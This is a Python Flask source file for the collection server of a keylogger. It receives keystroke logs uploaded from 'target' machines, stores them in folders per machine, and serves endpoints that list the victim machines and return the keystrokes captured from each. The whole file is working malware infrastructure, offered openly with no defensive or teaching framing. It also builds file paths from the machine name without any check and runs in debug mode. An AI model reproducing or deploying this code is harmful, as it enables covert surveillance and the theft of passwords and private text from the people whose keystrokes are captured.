from flask import Flask, request, jsonify
import time
import os
from flask_cors import CORS
app = Flask(__name__)
CORS(app)
target_machine = []
keystrokes_data = {}

@app.route("/")
def home():
    return "<h1>Key logger server is running</h1>"


def generate_log_filename():
    return "log_" + time.strftime("%Y-%m-%d_%H-%M-%S") + ".txt"


@app.route('/api/upload', methods=['POST'])
def upload():
    data = request.get_json()
    if not data or "machine" not in data or "data" not in data:
        return jsonify({"error": "Invalid payload"}), 400

    machine = data["machine"]
    log_data = data["data"]

    machine_folder = os.path.join("data", machine)
    if not os.path.exists(machine_folder):
        os.makedirs(machine_folder)
        target_machine.append(machine)

    if machine not in target_machine:
         target_machine.append(machine)

    filename = generate_log_filename()
    file_path = os.path.join(machine_folder, filename)
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(log_data)

    if machine not in keystrokes_data:
        keystrokes_data[machine] = {}
    keystrokes_data[machine][filename] = log_data

    return jsonify({"status": "success", "file": file_path}), 200


@app.route('/api/get_target_machines_list/', methods=['GET'])
def get_target_machines_list():
    if not os.path.exists("data"):
        return jsonify([])
    machines = [name for name in os.listdir("data") if os.path.isdir(os.path.join("data", name))]
    return jsonify(machines)



@app.route('/api/get_keystrokes_machine/<machine>', methods=['GET'])
def get_keystrokes_machine(machine):
    machine_folder = os.path.join("data", machine)
    if not os.path.exists(machine_folder):
        return jsonify({"error": "Machine not found"}), 404

    logs = {}
    for filename in os.listdir(machine_folder):
        file_path = os.path.join(machine_folder, filename)
        with open(file_path, "r", encoding="utf-8") as f:
            logs[filename] = f.read()

    return jsonify({machine: logs})



if __name__ == "__main__":
    app.run(debug=True)
